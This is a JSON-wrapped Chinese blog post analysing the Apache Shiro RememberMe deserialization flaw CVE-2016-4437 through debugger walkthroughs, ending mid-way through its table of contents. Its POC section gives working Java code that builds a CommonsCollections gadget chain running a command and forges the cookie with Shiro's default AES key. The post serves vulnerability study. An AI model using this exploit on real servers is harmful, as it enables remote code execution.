{"title":"CVE-2016-4437漏洞分析","uid":"83f5599915e77d106d96bdbba8cc47db","slug":"CVE-2016-4437","date":"2021-11-09T16:18:15.000Z","updated":"2021-12-10T16:12:39.000Z","comments":true,"path":"api/articles/CVE-2016-4437.json","keywords":null,"cover":"https://img1.imgtp.com/2022/12/30/DipNUksO.jpg","content":"<h1 id=\"CVE-2016-4437漏洞分析\"><a href=\"#CVE-2016-4437漏洞分析\" class=\"headerlink\" title=\"CVE-2016-4437漏洞分析\"></a>CVE-2016-4437漏洞分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。</p>\n<p>影响版本：Shiro  &lt; 1.2.5</p>\n<p>漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</p>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>Shiro 在 0.9 版本开始提供 RememberMe 模块，用于应用程序记录登录用户凭证的功能。</p>\n<h3 id=\"RememberMeManager\"><a href=\"#RememberMeManager\" class=\"headerlink\" title=\"RememberMeManager\"></a>RememberMeManager</h3><p><code>org.apache.shiro.mgt.RememberMeManager</code>接口提供了以下五个方法：</p>\n<ul>\n<li><code>getRememberedPrincipals()</code>：RememberMe 的功能，在指定上下文中寻找记录的<code>principals</code>。</li>\n<li><code>forgetIdentity()</code>：忘记用户身份标识。</li>\n<li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li>\n<li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li>\n<li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li>\n</ul>\n<h3 id=\"AbstractRememberMeManager\"><a href=\"#AbstractRememberMeManager\" class=\"headerlink\" title=\"AbstractRememberMeManager\"></a>AbstractRememberMeManager</h3><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p>\n<ul>\n<li><code> DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量（encryptionCipherKey&#x2F;decryptionCipherKey）。</li>\n<li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li>\n<li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li>\n</ul>\n<h3 id=\"CookieRememberMeManager\"><a href=\"#CookieRememberMeManager\" class=\"headerlink\" title=\"CookieRememberMeManager\"></a>CookieRememberMeManager</h3><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类在 Shiro 中实现使用 Cookie 记录用户身份信息的功能，比较值得关注的方法为<code>getRememberedSerializedIdentity()</code>：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;\n        if (!WebUtils.isHttp(subjectContext)) &#123;\n            if (log.isDebugEnabled()) &#123;\n                String msg &#x3D; &quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;;\n                log.debug(msg);\n            &#125;\n\n            return null;\n        &#125; else &#123;\n            WebSubjectContext wsc &#x3D; (WebSubjectContext)subjectContext;\n            if (this.isIdentityRemoved(wsc)) &#123;\n                return null;\n            &#125; else &#123;\n                HttpServletRequest request &#x3D; WebUtils.getHttpRequest(wsc);\n                HttpServletResponse response &#x3D; WebUtils.getHttpResponse(wsc);\n                String base64 &#x3D; this.getCookie().readValue(request, response);\n                if (&quot;deleteMe&quot;.equals(base64)) &#123;\n                    return null;\n                &#125; else if (base64 !&#x3D; null) &#123;\n                    base64 &#x3D; this.ensurePadding(base64);\n                    if (log.isTraceEnabled()) &#123;\n                        log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;);\n                    &#125;\n\n                    byte[] decoded &#x3D; Base64.decode(base64);\n                    if (log.isTraceEnabled()) &#123;\n                        log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded !&#x3D; null ? decoded.length : 0) + &quot; bytes.&quot;);\n                    &#125;\n\n                    return decoded;\n                &#125; else &#123;\n                    return null;\n                &#125;\n            &#125;\n        &#125;\n    &#125;</code></pre>\n\n<p>在该方法中，主要实现了获取 Cookie 中的内容并通过 Base64 解码，然后返回 byte 数组的功能。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>漏洞环境已经上传到 github 中：<a href=\"https://github.com/dota-st/vulnEnv\">https://github.com/dota-st/vulnEnv</a></p>\n<p>先简单了解一下该漏洞的原理：</p>\n<p>当用户登录勾选<code>remember me</code>的时候，Shiro 会将当前用户的 Cookie 信息序列化后进行 AES 加密存储在 Cookie 的 RememberMe 字段中，在下次请求时会读取 Cookie 中的 RememberMe 字段并进行 AES 解密然后反序列化。<br><img src=\"https://img1.imgtp.com/2022/12/29/ToITxSlA.png\" alt=\"image-20221018155429239.png\" title=\"image-20221018155429239.png\" /></p>\n<p>然而通过前面的<code>AbstractRememberMeManager</code>类我们知道，AES 加解密的 KEY 是硬编码在该类中的，因此当我们知道 KEY之后，可以伪造 RememberMe 字段进而触发反序列化漏洞。</p>\n<p>那么我们便开始一步步跟着调试吧，打上断点，在 Cookie 添加 RememberMe 字段然后发送请求。</p>\n<p>在<code>\t#getRememberedPrincipals()</code>方法中将上下文数据传入到<code>getRememberedSerializedIdentity()</code>方法中<br><img src=\"https://img1.imgtp.com/2022/12/29/uHdTSAWJ.png\" alt=\"image-20221018111741540.png\" title=\"image-20221018111741540.png\" /></p>\n<p>接着会跳转到<code>CookieRememberMeManager#getRememberedSerializedIdentity()</code>方法中<br><img src=\"https://img1.imgtp.com/2022/12/29/Sf16KcHV.png\" alt=\"image-20221018155851444.png\" title=\"image-20221018155851444.png\" /></p>\n<p>可以看到<code>readValue()</code>方法会从请求中获取<code>RememberMe</code>字段的值，最后通过<code>Base64.decode()</code>解码后返回 byte 数组，接着又回到<code>getRememberedPrincipals()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/qdKjkx2l.png\" alt=\"image-20221018160049461.png\" title=\"image-20221018160049461.png\" /></p>\n<p>继续跟进<code>convertBytesToPrincipals()</code>方法，调用<code>decrypt()</code>方法进行解密<br><img src=\"https://img1.imgtp.com/2022/12/29/zOV9uQZk.png\" alt=\"image-20221018160159474.png\" title=\"image-20221018160159474.png\" /></p>\n<p>继续跟进<code>decrypt()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/mTj9Vepx.png\" alt=\"image-20221018160308176.png\" title=\"image-20221018160308176.png\" /></p>\n<p>这里调用到<code>getDecryptionCipherKey()</code>方法，我们跟进一下<br><img src=\"https://img1.imgtp.com/2022/12/29/flxbL2ej.png\" alt=\"image-20221018162044495.png\" title=\"image-20221018162044495.png\" /></p>\n<p>这里到了<code>AbstractRememberMeManager#getDecryptionCipherKey()</code>方法，前面我们提到过该类，在这里获取到了硬编码的秘钥。</p>\n<p>接着<code>decrypt()</code>方法走完 return 了<code>serialized</code>字节数组，最后调用了<code>deserialize()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/eyvFYZSG.png\" alt=\"image-20221018162427231.png\" title=\"image-20221018162427231.png\" /></p>\n<p>继续跟进<code>deserialize()</code>方法，跟着调用了<code>getSerializer().deserialize()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/dRtVHtwe.png\" alt=\"image-20221018162530315.png\" title=\"image-20221018162530315.png\" /></p>\n<p>继续跟进<code>getSerializer().deserialize()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/YYCScXS6.png\" alt=\"image-20221018162715157.png\" title=\"image-20221018162715157.png\" /></p>\n<p>可以看到，这里通过<code>ByteArrayInputStream()</code>获取了输入流，最后调用<code>readObject()</code>方法进行反序列化。</p>\n<p>回顾梳理一下流程：</p>\n<ol>\n<li>传入<code>RememberMe</code>字段，获取该字段的值；</li>\n<li>对<code>RememberMe</code>进行 Base64 解码，然后调用硬编码的 KEY 进行解密；</li>\n<li>对解密后的内容进行反序列化。</li>\n</ol>\n<h2 id=\"编写-POC\"><a href=\"#编写-POC\" class=\"headerlink\" title=\"编写 POC\"></a>编写 POC</h2><p>在 pom.xml 文件里添加了<code>CommonCollections</code>和<code>javassist</code>依赖，以完成反序列化的利用演示。<br><img src=\"https://img1.imgtp.com/2022/12/29/8GIzvwji.png\" alt=\"image-20221018163306620.png\" title=\"image-20221018163306620.png\" /></p>\n<p>这里通过前面我们学习的<code>CommonsCollections11</code>链子生成恶意文件</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.serialize;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;12 15:50\n *&#x2F;\npublic class CommonsCollections11 &#123;\n    public static void main(String[] args) throws Exception&#123;\n        CommonsCollections11 commonsCollections11 &#x3D; new CommonsCollections11();\n        commonsCollections11.serialize();\n    &#125;\n    public void serialize() throws Exception&#123;\n        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\\&quot;open -a Calculator.app\\&quot;);&quot;;\n        &#x2F;&#x2F; 创建evailClass\n        ClassPool pool &#x3D; ClassPool.getDefault();\n        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        CtClass evailClass &#x3D; pool.makeClass(&quot;evailClass&quot;);\n        &#x2F;&#x2F; 将代码插进static&#123;&#125;\n        evailClass.makeClassInitializer().insertBefore(cmd);\n        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        &#x2F;&#x2F; 转换成字节码\n        byte[] classBytes &#x3D; evailClass.toBytecode();\n        byte[][] targetByteCodes &#x3D; new byte[][]&#123;classBytes&#125;;\n        &#x2F;&#x2F; 反射修改\n        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();\n        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);\n        bytecodes.setAccessible(true);\n        bytecodes.set(templates, targetByteCodes);\n\n        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);\n        name.setAccessible(true);\n        name.set(templates, &quot;name&quot;);\n\n        Field _class &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);\n        _class.setAccessible(true);\n        _class.set(templates, null);\n\n        &#x2F;&#x2F; 创建恶意的调用链\n        InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;toString&quot;,new Class[0], new Object[0]);\n        Map innerMap &#x3D; new HashMap&lt;&gt;();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, invokerTransformer);\n        &#x2F;&#x2F; 创建TiedMapEntry实例\n        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(outerMap,templates);\n        Map expMap &#x3D; new HashMap&lt;&gt;();\n        expMap.put(tiedMapEntry,&quot;valueTest&quot;);\n        outerMap.remove(templates);\n        &#x2F;&#x2F; 通过反射修改iMethodName值为newTransformer\n        Field f &#x3D; invokerTransformer.getClass().getDeclaredField(&quot;iMethodName&quot;);\n        f.setAccessible(true);\n        f.set(invokerTransformer, &quot;newTransformer&quot;);\n        FileOutputStream fileOutputStream &#x3D; new FileOutputStream(&quot;1.txt&quot;);\n        &#x2F;&#x2F; 创建并实例化对象输出流\n        ObjectOutputStream out &#x3D; new ObjectOutputStream(fileOutputStream);\n        out.writeObject(expMap);\n\n    &#125;\n    \n&#125;</code></pre>\n\n<p>根据对应的<code>AbstractRememberMeManager#encrypt()</code>方法编写加密</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.shiro;\n\nimport com.sun.org.apache.xerces.internal.impl.dv.util.Base64;\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.util.ByteSource;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.FileInputStream;\nimport java.io.InputStream;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;10 10:45\n *&#x2F;\npublic class Shiro550 &#123;\n    public static void main(String[] args) throws Exception &#123;\n        String path &#x3D; &quot;1.txt&quot;;\n        byte[] key &#x3D; Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);\n        AesCipherService aes &#x3D; new AesCipherService();\n        ByteSource ciphertext &#x3D; aes.encrypt(getBytes(path), key);\n        System.out.printf(ciphertext.toString());\n    &#125;\n\n\n    public static byte[] getBytes(String path) throws Exception&#123;\n        InputStream inputStream &#x3D; new FileInputStream(path);\n        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();\n        int n &#x3D; 0;\n        while ((n&#x3D;inputStream.read())!&#x3D;-1)&#123;\n            byteArrayOutputStream.write(n);\n        &#125;\n        byte[] bytes &#x3D; byteArrayOutputStream.toByteArray();\n        return bytes;\n\n    &#125;\n&#125;</code></pre>\n\n<p>运行后获得构造的恶意<code>RememberMe</code>字段内容，添加到 Cookie 中发送请求，成功弹出计算器。<br><img src=\"https://img1.imgtp.com/2022/12/29/A1Kw43fh.png\" alt=\"image-20221018164755328.png\" title=\"image-20221018164755328.png\" /></p>\n<h2 id=\"Shiro-与-CC6\"><a href=\"#Shiro-与-CC6\" class=\"headerlink\" title=\"Shiro 与 CC6\"></a>Shiro 与 CC6</h2><p>在<code>Commons-Collections11</code>的时候曾提过<code>Commons-Collections6</code>这条链子在 shiro 中使用会报错，但如果你用<code>Commons-Collections6</code>生成的 POC 在我上面搭的环境会发现依然能正常弹出计算器，并没有出现报错，这是为什么呢？</p>\n<p>在上述环境使用的依赖是<code>shiro-spring</code>，也就是用 Spring-boot 构建的 Shiro</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;dependency&gt;\n            &lt;groupId&gt;org.apache.shiro&lt;&#x2F;groupId&gt;\n            &lt;artifactId&gt;shiro-spring&lt;&#x2F;artifactId&gt;\n            &lt;version&gt;1.2.4&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;</code></pre>\n\n<p>Shiro 的原生依赖只用到了：<code>shiro-core</code>和<code>shiro-web</code>，那么<code>Spring</code>构建的<code>Shiro</code>和原生的<code>Shiro</code>有什么不同呢？</p>\n<p>我们使用原生环境调调看，这里直接去 Shiro 的仓库下载，然后修改一下 pom.xml 文件即可，下面用到的环境也上传到前面提到的 github 仓库了。运行后访问主页，使用<code>CommonCollections6</code>的 POC 发送请求<br><img src=\"https://img1.imgtp.com/2022/12/29/49JAvBtJ.png\" alt=\"image-20221020003021727.png\" title=\"image-20221020003021727.png\" /></p>\n<p>并没有弹出计算器，再回来看看 idea<br><img src=\"https://img1.imgtp.com/2022/12/29/mcAZC5U5.png\" alt=\"image-20221020003046360.png\" title=\"image-20221020003046360.png\" /></p>\n<p>报错了，具体错误如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system&#x2F;application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</code></pre>\n\n<p>翻译过来大体意思就是<code>Transformer</code>类找不到，我们跟一下反序列化的入口点看看<br><img src=\"https://img1.imgtp.com/2022/12/29/Ob8W4g5f.png\" alt=\"image-20221020112505932.png\" title=\"image-20221020112505932.png\" /></p>\n<p>这里可以看到最后用的是<code>ClassResolvingObjectInputStream</code>类返回输入流，而不是常规的<code>ObjectInputStream</code>类，跟进该类<br><img src=\"https://img1.imgtp.com/2022/12/29/qKPdg7m3.png\" alt=\"image-20221020112940956.png\" title=\"image-20221020112940956.png\" /></p>\n<p>在<code>ClassResolvingObjectInputStream</code>类中继承了<code>ObjectInputStream</code>类并且重写了<code>resolveClass()</code>方法，跟进<code>ClassUtils.forName()方法</code><img src=\"https://img1.imgtp.com/2022/12/29/A3I6W9F2.png\" alt=\"image-20221020113104243.png\" title=\"image-20221020113104243.png\" /><br>又继续调用了<code>loadClass()</code>方法，其中参数值为<code>[Lorg.apache.commons.collections.Transformer;</code></p>\n<p>这里的格式是<code>JNI</code>字段描述符，<code>[</code>表示数组，<code>L</code>代表类描述符，<code>;</code>表示类名到这里结束。</p>\n<p>接着继续跟进<code>loadClass()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/kPUYizPw.png\" alt=\"image-20221020113425888.png\" title=\"image-20221020113425888.png\" /></p>\n<p>可以看到这里调用的<code>ClassLoader</code>为<code>ParallerWebappClassLoader</code>，接着到<code>loadClass()</code>方法，这里接着跟进需要添加 tomcat 的源码才能继续进行调试（这里是偷懒做法，如果想食用更佳，移步<a href=\"../../%E7%8E%AF%E5%A2%83&%E5%85%B6%E4%BB%96/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/Tomcat%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95.md\">Tomcat源码调试</a>）<br><img src=\"https://img1.imgtp.com/2022/12/29/cNs5rBHe.png\" alt=\"image-20221020113701346.png\" title=\"image-20221020113701346.png\" /></p>\n<p>导入 tomcat 的 jar 包之后继续跟进<code>loadClass()</code>方法进入到了<code>WebappClassLoaderBase#loadClass()</code><br><img src=\"https://img1.imgtp.com/2022/12/29/7n8gxRQ7.png\" alt=\"image-20221020113737475.png\" title=\"image-20221020113737475.png\" /></p>\n<p>玩下走到<code>findLoadedClass0()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/Cj41sKO9.png\" alt=\"image-20221021234307342.png\" title=\"image-20221021234307342.png\" /></p>\n<p><code>findLoadedClass0()</code>方法去缓存中查找是否存在，从跟的结果上得到是不存在，继续往下走到<code> this.findLoadedClass()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/9dymIqfY.png\" alt=\"image-20221022160745842.png\" title=\"image-20221022160745842.png\" /></p>\n<p>依然为null，后面的跟着几个方法都是为 null，我们略去，到最后一步关键处，也就是到了<code>Class.forName()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/8rakn69V.png\" alt=\"image-20221020113936096.png\" title=\"image-20221020113936096.png\" /></p>\n<p>这里可以看到，此时的父加载器为<code>URLClassLoader</code><br><img src=\"https://img1.imgtp.com/2022/12/29/A1FZjVFz.png\" alt=\"image-20221020114136052.png\" title=\"image-20221020114136052.png\" /></p>\n<p>其中<code>ucp</code>是<code>URLClassLoader</code>类的字段，<code>ucp</code>的成员<code>path</code>是一个 ArrayList 对象，存储着类的搜索路径。而这里这些路径全都是 tomcat 下的 lib 目录文件，并没有<code>commons-collections</code>的依赖文件。</p>\n<p>下面贴上在<code>Class.forName()</code>方法后的 debug 过程视频（因为写成文字描述过于繁琐就贴上视频）</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>视频挂了，有需要的右下角发邮件给我》</p></blockquote>\n<p>在 debug 视频中可以看到，传进<code>Class.forName()</code>方法的参数 name 为<code>[Lorg.apache.commons.collections.Transformer;</code>，接着后面走到<code>findLoadedClass()</code>方法时还原成了正常的<code>org.apache.commons.collections.Transformer</code>，因此有些文章在跟到前面时就断定是先前的<code>[Lorgxxx</code>格式导致无法找到的结论并不准确，这并不是最终过程。</p>\n<p>此外，可以看到<code>ClassLoader</code>的加载过程为<code>AppClassLoader</code> –&gt; <code>ExtClassLoader</code> –&gt; <code>BootstrapClassLoa·der</code>，均搜索不到<code>org.apache.commons.collections.Transformer</code>。</p>\n<p>搜索不到后抛出<code>ClassNotFoundException</code>的异常<br><img src=\"https://img1.imgtp.com/2022/12/29/jlGO4ppU.png\" alt=\"image-20221020114557155.png\" title=\"image-20221020114557155.png\" /></p>\n<img src=\"https://img1.imgtp.com/2022/12/29/AugdF44W.png\" alt=\"image-20221020114634262.png\" title=\"image-20221020114634262.png\" />\n\n<p>因此和之前的报错对应上了，那么为什么 spring 构建的 shiro 没有报错正常弹出计算器了呢？</p>\n<p>我们继续调试一下<br><img src=\"https://img1.imgtp.com/2022/12/29/fXXhjH3b.png\" alt=\"image-20221020114824559.png\" title=\"image-20221020114824559.png\" /></p>\n<p>在该环境中，加载的<code>ClassLoader</code>为<code>TomcatEmbeddedWebappClassLoader</code>，而不是之前 shiro 原生环境的<code>ParallerWebappClassLoader</code>。</p>\n<p>继续跟进<code>loadClass()</code>方法，跳到了<code>TomcatEmbeddedWebappClassLoader#loadClass()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/XVNH4V6t.png\" alt=\"image-20221020115032790.png\" title=\"image-20221020115032790.png\" /></p>\n<p>继续往下走，直到<code>Class.forName()</code>方法<br><img src=\"https://img1.imgtp.com/2022/12/29/sL2SE1LB.png\" alt=\"image-20221020115153447.png\" title=\"image-20221020115153447.png\" /></p>\n<p>可以看到此时的父加载器为<code>AppClassLoader</code>系统类加载器，再看看此时的 path<br><img src=\"https://img1.imgtp.com/2022/12/29/1pSenj3K.png\" alt=\"image-20221020115615209.png\" title=\"image-20221020115615209.png\" /></p>\n<p>此时的 path 不再是 tomcat 下的，而是 java 环境中的，包含了<code>commons-collections</code>依赖，因此可以成功加载到<br><img src=\"https://img1.imgtp.com/2022/12/29/Eco9tuM2.png\" alt=\"image-20221020115831830.png\" title=\"image-20221020115831830.png\" /></p>\n<p>这也解释了为什么在 spring 构建的 Shiro 环境中<code>Commons-Collections6</code>可以打成功，而原生的 Shiro 环境却报错失败的情况。</p>\n<p>至于为什么 path 会不一样，父类加载器也不一样，尝试跟了一下，实在过于复杂，遂暂时放弃，调试到此。</p>\n<p>等哪一天知识储备足够了，再来解惑。</p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>在 Shiro 1.2.5 版本的更新中，用户需要手动配置 CipherKey，如果不设置，将会动态生成一个 CipherKey。但反序列化流程没有修改，这也是 Shiro 至今依然在各大 HW 演练中频繁出现的原因。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>原创作者地址：<a href=\"https://github.com/dota-st/vulnEnv\">https://github.com/dota-st/vulnEnv</a></p></blockquote>\n","text":"CVE-2016-4437漏洞分析前言CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。 影响版本：Shiro &lt; 1.2.5 漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":3,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":3,"path":"api/tags/Java安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CVE-2016-4437%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">CVE-2016-4437漏洞分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">前置知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RememberMeManager\"><span class=\"toc-text\">RememberMeManager</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#AbstractRememberMeManager\"><span class=\"toc-text\">AbstractRememberMeManager</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CookieRememberMeManager\"><span class=\"toc-text\">CookieRememberMeManager</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\"><span class=\"toc-text\">漏洞分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BC%96%E5%86%99-POC\"><span class=\"toc-text\">编写 POC</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Shiro-%E4%B8%8E-CC6\"><span class=\"toc-text\">Shiro 与 CC6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span 